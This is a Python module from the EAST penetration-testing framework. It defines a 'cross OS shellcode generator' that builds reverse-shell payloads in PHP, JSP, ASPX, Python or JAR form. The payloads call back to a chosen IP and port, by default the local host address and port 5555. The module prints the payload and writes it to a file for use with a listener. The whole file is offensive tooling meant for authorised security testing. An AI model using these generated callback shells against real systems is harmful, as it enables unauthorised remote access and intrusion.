#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
from shellcodes import ShellUtils
from shellcodes import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "cross_os_shellcode_generator"
INFO['DESCRIPTION'] = "Cross OS ShellCode Generator"
INFO['VENDOR'] = "https://github.com/C0reL0ader/EaST"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['']
INFO["CVE Name"] = ''
INFO["NOTES"] = """This tool used to generate different types of cross os shellcodes and allow to use it with listener to test shellcodes.
"""

INFO['CHANGELOG'] = "05 May, 2016. Written by East team"
INFO['PATH'] = 'Tools/'

OPTIONS = OrderedDict()
OPTIONS['SHELLCODE_TYPE'] = dict(options = [ShellUtils.Constants.ShellcodeType.PHP, ShellUtils.Constants.ShellcodeType.JSP, ShellUtils.Constants.ShellcodeType.ASPX, ShellUtils.Constants.ShellcodeType.PYTHON, ShellUtils.Constants.ShellcodeType.JAR], selected = 'php')
OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname())
OPTIONS['CALLBACK_PORT'] = 5555
OPTIONS['FILENAME'] = 'shellcode'
OPTIONS['MAKE_INLINE'] = True

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        return
    
    def run(self):
        self.args()
        shellcode_type = self.args.get('SHELLCODE_TYPE', 'php')
        
        local_ip = self.args.get('CALLBACK_IP', '')
        self.log('[+] Callback IP: {}'.format(local_ip))
        
        local_port = int(self.args.get('CALLBACK_PORT', 5555))
        if self.args['listener']:
            local_port = self.args['listener']['PORT']
            self.log('[!] Listener enabled, so using listener port')
        self.log('[+] Callback PORT: {}'.format(local_port))
        
        shellcode_name = self.args.get('FILENAME', ShellUtils.TIMESTAMP)
        shellcode_name = shellcode_name.replace('..', '').replace('/', '').replace('\\', '')
        
        make_inline = self.args.get('MAKE_INLINE', False)
        self.log('[+] Inline: ' + str(make_inline))
        
        try:
            s = Shellcodes.CrossOSShellcodes(local_ip, local_port)
            shellcode = s.create_shellcode(shellcode_type, make_inline)
        except Exception, e:
            self.log(e)
            self.finish(False)
            
        self.log('[+] Shellcode:')
        self.log(shellcode)
        self.writefile(shellcode, shellcode_name + '.' + shellcode_type)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
